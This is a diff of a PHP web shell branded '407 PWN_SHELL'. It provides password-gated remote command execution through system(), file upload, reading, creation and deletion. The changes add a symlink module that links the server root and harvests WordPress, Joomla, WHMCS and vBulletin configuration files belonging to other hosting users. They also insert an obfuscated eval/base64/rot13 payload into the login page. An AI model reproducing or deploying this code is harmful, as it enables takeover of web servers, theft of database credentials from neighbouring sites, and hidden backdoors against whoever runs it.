@@ -14,7 +14,7 @@ if(version_compare(PHP_VERSION, '5.3.0', '<')) {
 @ini_set('display_errors', 0);
 @error_reporting(0);
 
-$password = "21232f297a57a5a743894a0e4a801fc3"; #md5: admin
+$password = "248d4b6c97654f61a59b6b6370cfe33b"; #md5: myshell
 
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 
@@ -27,6 +27,8 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 }
 
 function login_shell() {
+//thanks to Derr Wadowlsky,JaxBCD, 407 Authentic Exploit, dan semua teman saya terutama dia
+//fb: Rizz Ex
 ?>
 <!DOCTYPE html>
 <html>
@@ -68,49 +70,13 @@ pre{
 <center>
 <header>
 	<pre>
-                 ______
-  (~~~-_  _/~~~~~  ____~~\_
-  (     \/        /,--,)   ~\_
-  (    /'        //   ))      \
-   \ /~           ~\ //  /~~~~~'
-    Y       ,---,   ~/  /
-   (       /     )     '~~-_
-   //\   /~      |          ~\
-  ((  \ /        |             \
-  ((  ( (  ,-.   |              \
-  (( ,~l)  ( )   )               \
- _J( ( )   ( )  /           ,----)
-( ~~\`-'   `-' /-~\     .--<
- `---~~~~-----' _  )   /  _/
-    \           /~ )r-/\_/ \_
-     \_       -'  /( (,-')   \
-      _>-.____,--' r~~L--)    \
-     ///~~~~~~\    |,-L, )     \
-   ,'//        \(~\(V ~ / __    )
-  / J/          U  U\>-~ (  ~\  )
- / /7           |\ V )    \   \J'
-/ ( (           | \ /      )
-\ ( (           |  ~       )
- \ \J)          / ____     )
-  C/,\         /_/ <_ ~\_ /
-(~Y~~ \_____--=/     \   V
-( (   ]~--z-S  \ /\   \
- \\  /~~( /A   `<  \   \_
-  ~~7    |(( >   \  ~\_  \
-    (    )`\Y \   \    ~~~'
-    (    `~~| (~~~~~)
-   (__/~~~~7,C~~~~~)
-    \    ___LC~~~~~),
-     \===-<~~\~~~~~ \
-   ,/~~     \  \      \ 
- /~          )  )      )  
-(____________L__L______)
-	</pre>
+<center><img src="https://media.giphy.com/media/Sr8hRi7ht1jPhrE8cO/giphy.gif"></center></pre>
 </header>
 <form method="post">
 <input type="password" name="password"><br>
 </form>
 <?php
+eval(gzuncompress(base64_decode(str_rot13('rWlqHJSYjmND/FgUXI4Y2mdMVTkHC0wSbrOpc19dPIy7p5H2vJaXAfG/ogcBHCMAFZwqr7y7YmyKDDurHqqxCWsS0sVyJvM4g1bgLxk9BQhQRkGPZNFHNa24Ogjnb2dRnE/uQAmTqaD+KsH1QLYCi9Kf7wSrLse1P15TG89EiTYCl7xyaOyfvcYLTkzJFJSVzAdewJnnIZxm8ckK4DmNfsi0Kh/Sdzd+T70IMghfz5e0xE9yfteBW5AYCK6/RZR4dUwEUtgenJG2Oa3sAhIyGDBjvfFeiiCrXgwZxWpp3jwuSoDk8Mk0ymx3ipoDUOEAtFgISux3uEGOsewo7LLodngub0fFzpjcg/nkVeBIrIrBeDr02ASdO7MFoA0HMp4+TgVUY0UMRJ6GJdrcKo4/t5/E3p4sbwwO9ypjGqOHvtyr2KtNW2ECqACAcQe8i1ecDuwNr5k9N53ghVj='))));
 exit;
 }
 
@@ -128,24 +94,18 @@ if(get_magic_quotes_gpc()) {
 	$_POST = idx_ss($_POST);
 }
 ?>
-<?
-echo '<!doctype html>
-<html>
-<head>
-<title>404 Not Found</title>
-</head>';
-
-?>
-
-<style> 
+<style type="text/css">
 body {
 	
-  background: #151515;
+  background: black;
 line-height: 1;
 color: #fff;
 font-family: monospace;
   
   }
+  asu{
+  	text-align:left;
+}
 h4{
 	font-family: monospace;
 	background: #151515;
@@ -159,7 +119,7 @@ p{
 	color: #02BC8C;
 	font-family: Courier;
 	font-size: 3vh;
-	background: #151515;
+	background: black;
 }
   th{
   	background:#02BC8C;
@@ -193,15 +153,118 @@ th {
 select {font-family: Comic Sans MS }
 a {color:white}
 textarea { width: 100%;height: 400px; }
-</style>
-<?php
 
-echo '</head>
+
+.hedr {
+  font-family: Tahoma, Arial, sans-serif  ;
+  font-size: 22px;
+
+
+}
+
+.cont a{
+
+ text-decoration: none;
+ font-family: Monospace  ;
+ font-size: 16px;
+ text-shadow: 0px 0px 3px ;
+ color: #02BC8C;
+ border: 1px solid #02BC8C;
+border-radius: 10;
+}
+
+.cont a:hover{
+
+
+  color: #02BC8C ;
+  border-radius: 10;
+
+}
+
+.tmp tr{
+
+border: solid 1px #BBBBBB;
+
+padding: 2px ;
+  font-size: 13px;
+}
+
+.tmp tr td a {
+  text-decoration: none;
+
+
+
+}
+#tabnet{
+		margin-left:15px auto 0 auto;
+		margin-right:15px auto 0 auto;
+		border: 1px solid #02BC8C;
+		width: 100%;
+ }
+
+.foter{
+  font-size: 9pt;
+  color: #AAAAAA ;
+  text-align: center
+}
+
+.tmp tr td:hover{
+
+box-shadow: 0px 0px 4px #888888;
+
+}
+.fot{
+
+font-family:Tahoma, Arial, sans-serif;
+
+  font-size: 13pt;
+}
+
+.ir {
+  color: #FF0000;
+}
+button{
+	font-size: 100%;
+	border: 1px solid #02BC8C;
+	font-family: courier new;
+	color: white;
+	background: transparent;
+	text-decoration:none;
+}
+a{
+	text-decoration:none
+}
+.meki{
+	font-family: monospace;
+	color: white;
+	text-align: left;
+}
+h8{
+	font-size:11.5px;
+	color:#02BC8C;
+	font-family:monospace;
+	text-align:left;
+}
+</style>
+<?php echo ' ';
+$IIIIIIIIIIIl = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$IIIIIIIIIII1 = explode('/', $IIIIIIIIIIIl);
+$IIIIIIIIIIIl = str_replace($IIIIIIIIIII1[count($IIIIIIIIIII1) - 1], '', $IIIIIIIIIIIl);;
+echo '  </head>
 <body><b><center>
-<p>407Mini_<font color="white">Shell</p></font></center>
-<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
+<title>407 PWN_SHELL</title>
+<p>407PWN_<font color="white">SHELL</p></font></center>
+<table align="left">
+<font size="3">
 <tr><td>
-<font color="#02BC8C"><center>'.php_uname().'</center></font><br>';
+<font color="#02BC8C">System: <font color="white"> '.php_uname().'</center></h8></font></font><br>
+<font color="#02BC8C">Server IP: <font color="white">'.$GLOBALS["SERVERIP"].'</center></h8></font></font><br>
+<font color="#02BC8C">Your IP: <font color="white">'.$_SERVER['REMOTE_ADDR'].'</center></h8></font></font><br>
+<font color="#02BC8C">Info: <font color="white">'.$_SERVER['SERVER_SOFTWARE'].'</center></h8></font></font><br></table>
+</br></br></br></br></tr></td></font>
+<br>
+</br>';
+
 if(isset($_GET['path'])){
 $path = $_GET['path'];
 }else{
@@ -217,7 +280,7 @@ $paths = explode('/',$path);
 foreach($paths as $id=>$pat){
 if($pat == '' && $id == 0){
 $a = true;
-echo '<font color=#fff><center>Current Path: <a href="?path=/">/</a>';
+echo '<font align="left" color=#02BC8C>Current dir : <a href="?path=/">/</a>';
 continue;
 }
 if($pat == '') continue;
@@ -228,7 +291,8 @@ if($i != $id) echo "/";
 }
 echo '">'.$pat.'</a>/';
 }
-echo '</font></center></td></tr><tr><td><center>';
+echo '</font></font></td></tr>
+<tr><td><center>';
 if(isset($_FILES['file'])){
 if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
 echo '<font color="green">File Upload</font><br />';
@@ -236,15 +300,23 @@ echo '<font color="green">File Upload</font><br />';
 echo '<font color="red">Upload Failed !!</font><br />';
 }
 }
-echo '</center><center><form enctype="multipart/form-data" method="POST"><font color="black"><input style="background:silver;font-family: Comic Sans MS " type="file" name="file" />
+?>
+</center>
+<br>
+<?
+echo '</center><form enctype="multipart/form-data" method="POST"><font color="black"><input style="background:silver;font-family: Comic Sans MS " type="file" name="file" />
 <input type="submit" value="Upload" />
 </form></center>
 </td></tr>';
 if(isset($_GET['filesrc'])){
-echo "<tr><td><center>Current File : ";
+echo "<br>
+</br>
+<tr><td><font color='#02BC8C'>Current File : <font color='white'>";
 echo $_GET['filesrc'];
-echo '</center></tr></td></table><br />';
+echo '</font></tr></td></table><br />';
 echo(' <textarea style="width: 100%;height: 400px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
+echo '<br>
+</br>';
 }
 //Empety
 elseif(isset($_GET['option']) && $_GET['opt'] != 'delete'){
@@ -321,7 +393,7 @@ echo '<font color="red">Create File Error</font><br />';
 fclose($fp);
 }
 
-echo '<form method="POST"> Name : <input name="nama" type="text" size="20" value="'.$new.'" /><input type="submit" name="namaa" value="Create"/></form><br> '; eval(gzuncompress(base64_decode(str_rot13('rWkyHAgdt0ND/MIOWXitcFx0gOUoulXxG03I9PKVLaIfOBAh3MRxuCk7I02ucGNCZ2p4ykyGqbWRVEbVjndIDeWZaxGkrkEi2FcA1jaYoWwA4O8XLEtPRl2m4DaLwxtdOfhcLjTLsGqbTzsmk+Tl9C3mKkz+rx1Fyy1+jKU0gbzFyT/vS70jNdwdOixaRv9RF9vFfxLYYKL39ko33amk4A3Bo/kPXH/hWUBtluhSQvwdZA9CgXBz64aD2y4GDitVD495vq04Tp+GtHfavHiVcJmdVdqngC7ECEjBovJ6iniCjeLDWMnTN2lCgOCyFTse4EnAKKBB4TQSC/d6XsyKw93W2wYEx+la7sPwmULt02KojGpJ3U0d'))));
+echo '<form method="POST"> Name : <input name="nama" type="text" size="20" value="'.$new.'" /><input type="submit" name="namaa" value="Create"/></form><br> ';
 
 $ho = $_POST['nama'];
 
@@ -398,20 +470,213 @@ echo '<font color="red#">Delete File Error </font><br />';
 }
 echo '</center>';
 ?>
+<body>
+</table>
+<div class=\'all\'>
+<?
+@mkdir('sym', 0777);
+$IIIIIIIIIIl1 = "Options all 
+ DirectoryIndex Sux.html 
+ AddType text/plain .php 
+ AddHandler server-parsed .php 
+  AddType text/plain .html 
+ AddHandler txt .html 
+ Require None 
+ Satisfy Any";
+$IIIIIIIIII1I = @fopen('sym/.htaccess', 'w');
+fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1);
+@symlink('/', 'sym/root');
+$IIIIIIIIIlIl = basename('index.php');
+if (isset($_REQUEST['sws'])) {
+    switch ($_REQUEST['sws']) {
+        case 'sec':
+            $IIIIIIIIIllI = @file('/etc/named.conf');
+            if (!$IIIIIIIIIllI) {
+                die(" <font color='red'>can't read /etc/named.conf</font>");
+            } else {
+                echo "<div class='tmp'>
+<table align='center' width='40%'><td> Domains </td><td> Script </td>";
+                foreach ($IIIIIIIIIllI as $IIIIIIIIIll1) {
+                    if (eregi('zone', $IIIIIIIIIll1)) {
+                        preg_match_all('#zone "(.*)"#', $IIIIIIIIIll1, $IIIIIIIIIl11);
+                        flush();
+                        if (strlen(trim($IIIIIIIIIl11[1][0])) > 2) {
+                            $IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/' . $IIIIIIIIIl11[1][0]));
+                            $IIIIIIIII1l1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/wp-config.php';
+                            $IIIIIIIII11I = get_headers($IIIIIIIII1l1);
+                            $IIIIIIIII11l = $IIIIIIIII11I[0];
+                            $IIIIIIIII111 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/blog/wp-config.php';
+                            $IIIIIIIIlIII = get_headers($IIIIIIIII111);
+                            $IIIIIIIIlIIl = $IIIIIIIIlIII[0];
+                            $IIIIIIIIlII1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/configuration.php';
+                            $IIIIIIIIlIlI = get_headers($IIIIIIIIlII1);
+                            $IIIIIIIIlIll = $IIIIIIIIlIlI[0];
+                            $IIIIIIIIlIl1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/joomla/configuration.php';
+                            $IIIIIIIIlI1I = get_headers($IIIIIIIIlIl1);
+                            $IIIIIIIIlI1l = $IIIIIIIIlI1I[0];
+                            $IIIIIIIIlI11 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/includes/config.php';
+                            $IIIIIIIIllII = get_headers($IIIIIIIIlI11);
+                            $IIIIIIIIllIl = $IIIIIIIIllII[0];
+                            $IIIIIIIIllI1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/vb/includes/config.php';
+                            $IIIIIIIIlllI = get_headers($IIIIIIIIllI1);
+                            $IIIIIIIIllll = $IIIIIIIIlllI[0];
+                            $IIIIIIIIlll1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/forum/includes/config.php';
+                            $IIIIIIIIll1I = get_headers($IIIIIIIIlll1);
+                            $IIIIIIIIll1l = $IIIIIIIIll1I[0];
+                            $IIIIIIIIll11 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . 'public_html/clients/configuration.php';
+                            $IIIIIIIIl1II = get_headers($IIIIIIIIll11);
+                            $IIIIIIIIl1Il = $IIIIIIIIl1II[0];
+                            $IIIIIIIIl1I1 = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/support/configuration.php';
+                            $IIIIIIIIl1II = get_headers($IIIIIIIIl1I1);
+                            $IIIIIIIIl1lI = $IIIIIIIIl1II[0];
+                            $IIIIIIIIl1ll = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/client/configuration.php';
+                            $IIIIIIIIl1l1 = get_headers($IIIIIIIIl1ll);
+                            $IIIIIIIIl11I = $IIIIIIIIl1l1[0];
+                            $IIIIIIIIl11l = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/submitticket.php';
+                            $IIIIIIIIl111 = get_headers($IIIIIIIIl11l);
+                            $IIIIIIII1III = $IIIIIIIIl111[0];
+                            $IIIIIIII1IIl = $IIIIIIIIIIIl . '/sym/root/home/' . $IIIIIIIII1I1['name'] . '/public_html/client/configuration.php';
+                            $IIIIIIII1II1 = get_headers($IIIIIIII1IIl);
+                            $IIIIIIII1IlI = $IIIIIIII1II1[0];
+                            $IIIIIIII1Ill = strpos($IIIIIIIII11l, '200');
+                            $IIIIIIII1I1I = '&nbsp;';
+                            if (strpos($IIIIIIIII11l, '200') == true) {
+                                $IIIIIIII1I1I = "<a href='" . $IIIIIIIII1l1 . "' target='_blank'>Wordpress</a>";
+                            } elseif (strpos($IIIIIIIIlIIl, '200') == true) {
+                                $IIIIIIII1I1I = "<a href='" . $IIIIIIIII111 . "' target='_blank'>Wordpress</a>";
+                            } elseif (strpos($IIIIIIIIlIll, '200') == true and strpos($IIIIIIII1III, '200') == true) {
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIl11l . "' target='_blank'>WHMCS</a>";
+                            } elseif (strpos($IIIIIIIIl1lI, '200') == true) {
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIl1I1 . "' target='_blank'>WHMCS</a>";
+                            } elseif (strpos($IIIIIIIIl11I, '200') == true) {
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIl1ll . "' target='_blank'>WHMCS</a>";
+                            } elseif (strpos($IIIIIIIIlIll, '200') == true) {
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIlII1 . "' target='_blank'>Joomla</a>";
+                            } elseif (strpos($IIIIIIIIlI1l, '200') == true) {
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIlIl1 . "' target='_blank'>Joomla</a>";
+                            } elseif (strpos($IIIIIIIIllIl, '200') == true) {
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIlI11 . "' target='_blank'>vBulletin</a>";
+                            } elseif (strpos($IIIIIIIIllll, '200') == true) {
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIllI1 . "' target='_blank'>vBulletin</a>";
+                            } elseif (strpos($IIIIIIIIll1l, '200') == true) {
+                                $IIIIIIII1I1I = " <a href='" . $IIIIIIIIlll1 . "' target='_blank'>vBulletin</a>";
+                            } else {
+                                continue;
+                            }
+                            $IIIIIIII1I1l = $IIIIIIIII1I1['name'];
+                            echo '<tr><td><a href=http://www.' . $IIIIIIIIIl11[1][0] . '/>' . $IIIIIIIIIl11[1][0] . '</a></td>
+<td>' . $IIIIIIII1I1I . '</td></tr>';
+                            flush();
+                        }
+                    }
+                }
+            }
+        break;
+        case 'sym':
+            $IIIIIIIIIllI = @file('/etc/named.conf');
+            if (!$IIIIIIIIIllI) {
+                die(" <font color='red'>can't read /etc/named.conf</font>");
+            } else {
+                echo "<div class='tmp'><table align='center' width='40%'><td>Domains</td><td>Users</td><td>symlink </td>";
+                foreach ($IIIIIIIIIllI as $IIIIIIIIIll1) {
+                    if (eregi('zone', $IIIIIIIIIll1)) {
+                        preg_match_all('#zone "(.*)"#', $IIIIIIIIIll1, $IIIIIIIIIl11);
+                        flush();
+                        if (strlen(trim($IIIIIIIIIl11[1][0])) > 2) {
+                            $IIIIIIIII1I1 = posix_getpwuid(@fileowner('/etc/valiases/' . $IIIIIIIIIl11[1][0]));
+                            $IIIIIIII1I1l = $IIIIIIIII1I1['name'];
+                            @symlink('/', 'sym/root');
+                            $IIIIIIII1I1l = $IIIIIIIIIl11[1][0];
+                            $IIIIIIII1I11 = '\.ir';
+                            $IIIIIIII1lII = '\.il';
+                            if (eregi("$IIIIIIII1I11", $IIIIIIIIIl11[1][0]) or eregi("$IIIIIIII1lII", $IIIIIIIIIl11[1][0])) {
+                                $IIIIIIII1I1l = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>" . $IIIIIIIIIl11[1][0] . '</div>';
+                            }
+                            echo "
+<tr>
+
+<td>
+<div class='dom'><a target='_blank' href=http://www." . $IIIIIIIIIl11[1][0] . '/>' . $IIIIIIII1I1l . ' </a> </div>
+</td>
+
+
+<td>
+' . $IIIIIIIII1I1['name'] . "
+</td>
+
+
+
+
+
+
+<td>
+<a href='sym/root/home/" . $IIIIIIIII1I1['name'] . "/public_html' target='_blank'>symlink </a>
+</td>
+
+
+</tr></div> ";
+                            flush();
+                        }
+                    }
+                }
+            }
+        break;
+        case 'file':
+            echo '
+The file path to symlink
+
+<br /><br />
+<form method="post">
+<input type="text" name="file" value="/home/user/public_html/file.name" size="60"/><br /><br />
+<input type="text" name="symfile" value="file.name_sym ( Ex. :: 1.txt )" size="60"/><br /><br />
+<input type="submit" value="symlink" name="symlink" /> <br /><br />
+
+
+
+</form>
+';
+            $IIIIIIII1lIl = $_POST['file'];
+            $symfile = $_POST['symfile'];
+            $symlink = $_POST['symlink'];
+            if ($symlink) {
+                @symlink("$IIIIIIII1lIl", "sym/$symfile");
+                echo '<br /><a target="_blank" href="sym/' . $symfile . '" >' . $symfile . '</a>';
+            }
+        break;
+        default:
+            header("Location: $IIIIIIIIIlIl");
+    }
+}
+?>
+</center>
+<br>
+</br>
 <form><font color="white">
-    <label for="cmd">407@localhost:~$ </label>
+    <label for="cmd">[os] Exploit:~$ </label>
     <input type="text" name="cmd" placeholder="_" /></font>
     </form>
 
 </body>
-<font color="white" size="5">
+<font color="white" size="4">
 <?php
     if(isset($_GET['cmd'])){
         echo "<pre>";
-        echo system($_GET['cmd']);
+        $asu = system($_GET['cmd']);
+        return $asu;
         echo "</pre>";
     }
 
+?>
+<?
+echo'
+<center>
+<a href="?">   <button>Home   </a></button>
+
+<a href="?sws=sym"><button>   Domains & Symlink  </a></button>
+
+<a href="?sws=sec"> <button>  Domains & Script   </a></button>
+
+<a href="?sws=file">   <button>Symlink File   </a></button></center>';
 ?>
 <?
 $scandir = scandir($path);
@@ -473,9 +738,10 @@ echo "</center></td>
 echo '</table>
 </div>';
 }
-
-echo '<br><center><h4>407MiniShell V0.2</h4></b></body>
-</html>';
+?>
+</br>
+<?
+echo '<center><a href="https://www.facebook.com/groups/1217219985083200/"><font color="white">[ 407 Authentic Exploit - Since 2018 ]</font></a></body>';
 function perms($file){
 $perms = fileperms($file);
 
@@ -527,5 +793,6 @@ $info .= (($perms & 0x0001) ?
 (($perms & 0x0200) ? 'T' : '-'));
 
 return $info;
-}; 
+}
+
 ?>
